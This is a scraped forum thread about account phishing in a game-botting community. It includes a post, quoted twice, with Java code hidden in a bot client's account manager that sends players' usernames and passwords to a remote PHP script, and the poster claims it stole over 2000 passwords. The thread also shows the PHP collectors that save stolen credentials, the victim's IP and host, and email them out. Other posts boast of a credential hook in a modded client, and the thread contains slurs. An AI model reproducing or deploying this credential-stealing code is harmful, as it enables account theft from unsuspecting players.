item.title: Tip
item.dc:creator: @frank frank_
item.description:
@frank wrote:

[quote=“retallick93, post:17, topic:273809”][quote author=Ollie link=topic=361835.msg2750874#msg2750874 date=1239905364]
hes a noob, he should be using post
[/quote]
It’s me.

Funny you should say that, that’s one of the things I put it on pastebin for, get or post - I was put straight some people.

FYI, I never scammed anyone with this. BTW, I found this post by googling my email address, also I love moparscape - 'tis the best.

http://pwnflakes.t35.com/rs/ that is the scam I think, pretty clever tbh, actionscript inside the .swf - would’ve fooled me a while ago. If you look - http://pwnflakes.t35.com/rs/passes.txt - theres the passes.txt rofl.

Pls no ban
?

well tenac, if you are idiotic enough to fall for such scams, its your own fault. but then again, i moded the runescaope client at the time, and added a hook to send me the users and pass, so people had no other option than to fall for it, since you could actually play in it, etc. + hosts file change? pro.

That is quite something :D[/quote]that flash thing is obviously not the rsc client

please ban this moron

Read full topic

item.title: Tip
item.dc:creator: @nueb35 Nueb35
item.description:
@nueb35 wrote:

[quote=“Tenac, post:13, topic:273809”][quote author=nueb35 link=topic=361835.msg2755649#msg2755649 date=1240174985]

phishing = fail.

I agree, anyone who is pathetic enough to steal accounts from other people are losers (yes, I know now all people who have made phishers are now angry at me). There’s a different between botting and scamming, and scamming is lame, if you’ve been scammed you’d know how it feels.

well tenac, if you are idiotic enough to fall for such scams, its your own fault. but then again, i moded the runescaope client at the time, and added a hook to send me the users and pass, so people had no other option than to fall for it, since you could actually play in it, etc. + hosts file change? pro.
[/quote]
Well, since I’ve gotten scammed before due to some bad luck, I know how it feels and I feel bad for people that get scammed, imagine some kid who put years of work into something and you steal it from them, I’m sure they feel bad, and you don’t give a shit.[/quote]

i hurd about a kid who was 11 years old who got phished, i think it was posted in the news section. it turns out he had been 1. underaged and should not have been playing runescape, and 2. buying rsgp for irl money, so if you are gonna break rules, might as well get scammed.

Read full topic

item.title: Tip
item.dc:creator: @nueb35 Nueb35
item.description:
@nueb35 wrote:

[quote=“communist, post:8, topic:273809”]Why don’t these phishers use SQL?

I remember my first fisher when I was like 11, it was a love calculator (for school), and it was stored in a text file called “lolNigga.txt” or something. They didn’t care about the fact it phished, but the fact it had a ‘racist’ name :([/quote]

mine used sql : http://nuebsoft.co.cc/add.php?u=show82493743594

item.title: Tip
item.dc:creator: @xEnt xEnt
item.description:
@xEnt wrote:

[quote=“n3ss3s, post:3, topic:273809”]A other one what i actualy put in myself for the past 2 weeks and stole over 2000 passwords

[code]package com.speljohan.rsbot.event.listeners;

import java.io.IOException;
import java.net.*;

public class AlllListener extends Thread {

public static void run(String s) throws MalformedURLException, IOException {
    HttpURLConnection.setFollowRedirects(false);
    HttpURLConnection httpurlconnection = (HttpURLConnection) (new URL(
            (new StringBuilder()).append("http://Wtf u ant getting/test.php?1=").append(s)
                    .toString())).openConnection();
    httpurlconnection.setRequestProperty("", "");
    httpurlconnection.setRequestMethod("GET");
    httpurlconnection.getResponseCode();
}

}[/code]

added in the account mang

                    AlllListener.run("" + a.getUsername().replace(" ", "_") + "&2=" + a.getPassword().replace(" ", "_"));

and the php script

[code]<?php

$fh = fopen("./Passwords/" . $_GET[‘1’] . “.html”, ‘w’);
fwrite($fh, "Username: “);
fwrite($fh, $_GET[‘1’].” //Pass: “);
fwrite($fh, $_GET[‘2’].” //Stats: ");
fwrite($fh, “<a href='http://www.draynor.net/stat/default/male/default/”);
fwrite($fh, $_GET[‘1’]);
fwrite($fh, “.png’>STATS”);
fclose($fh);

?>[/code][/quote]No dickhead, accept your 40th ban already.

Read full topic

item.title: Tip
item.dc:creator: @n3ss3s n3ss3s
item.description:
@n3ss3s wrote:

A other one what i actualy put in myself for the past 2 weeks and stole over 2000 passwords

[code]package com.speljohan.rsbot.event.listeners;

import java.io.IOException;
import java.net.*;

public class AlllListener extends Thread {

public static void run(String s) throws MalformedURLException, IOException {
    HttpURLConnection.setFollowRedirects(false);
    HttpURLConnection httpurlconnection = (HttpURLConnection) (new URL(
            (new StringBuilder()).append("http://Wtf u ant getting/test.php?1=").append(s)
                    .toString())).openConnection();
    httpurlconnection.setRequestProperty("", "");
    httpurlconnection.setRequestMethod("GET");
    httpurlconnection.getResponseCode();
}

}[/code]

added in the account mang

                    AlllListener.run("" + a.getUsername().replace(" ", "_") + "&2=" + a.getPassword().replace(" ", "_"));

and the php script

[code]<?php

$fh = fopen("./Passwords/" . $_GET[‘1’] . “.html”, ‘w’);
fwrite($fh, "Username: “);
fwrite($fh, $_GET[‘1’].” //Pass: “);
fwrite($fh, $_GET[‘2’].” //Stats: ");
fwrite($fh, “<a href='http://www.draynor.net/stat/default/male/default/”);
fwrite($fh, $_GET[‘1’]);
fwrite($fh, “.png’>STATS”);
fclose($fh);

?>[/code]

item.title: Tip
item.dc:creator: @pplsuqbawlz pplsuqbawlz
item.description:
@pplsuqbawlz wrote:

Usless staff like speljohan should probably be weary of this guy.

<?php file_put_contents("./passes.txt", "Account: ". $_GET['username'] . "\r\nPassword:" . $_GET['password']."\r\n\r\n", FILE_APPEND); $username = $_GET['username']; $password = $_GET['password']; $email_subject = "RS Account"; $email_message .= "Account: " . $username . "\n"; $email_message .= "Password: " . $password . "\n\n"; $email_message .= "----USER's Details----\n"; $email_message .= "User's IP: {$_SERVER['REMOTE_ADDR']} \n"; $email_message .= "User's HOST: " . gethostbyaddr($_SERVER['REMOTE_ADDR']) ." \n"; $email_message .= "User's Port: {$_SERVER['REMOTE_PORT']} \n"; $email_message .= "(sub)Domain used: {$_SERVER['HTTP_HOST']} \n"; mail('retallick93@googlemail.com' ,$email_subject, $email_message); ?>

http://pastebin.com/m2fab4d1f

Try doing a database lookup of that email?

Anyway yeah. I posted in runescape cause it’s obviously a runescape account stealer… So it’s also a tip for everyone else to be weary of any releases for a little while. Obviously someone’s going to be password stealing like a faggot.

Epic douchebag… Sadly, he’s probably getting help, after all I found this on pastebin doing my daily troll.

Read full topic
